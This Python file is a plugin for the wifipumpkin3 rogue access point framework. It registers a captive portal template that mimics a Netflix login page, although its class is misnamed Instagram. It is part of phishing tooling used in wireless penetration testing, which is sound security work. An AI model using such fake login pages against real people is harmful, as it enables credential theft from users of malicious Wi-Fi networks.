from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C

class Instagram(CaptiveTemplatePlugin):
    Name = "netflix"
    Version = "1.0"
    Description = "Template for netflix page login"
    Author = "mh4x0f"
    TemplatePath = C.TEMPLATES_FLASK + "templates/netflix"
    StaticPath = C.TEMPLATES_FLASK + "templates/netflix/static"
    Preview = C.TEMPLATES_FLASK + "templates/netflix/preview.png"
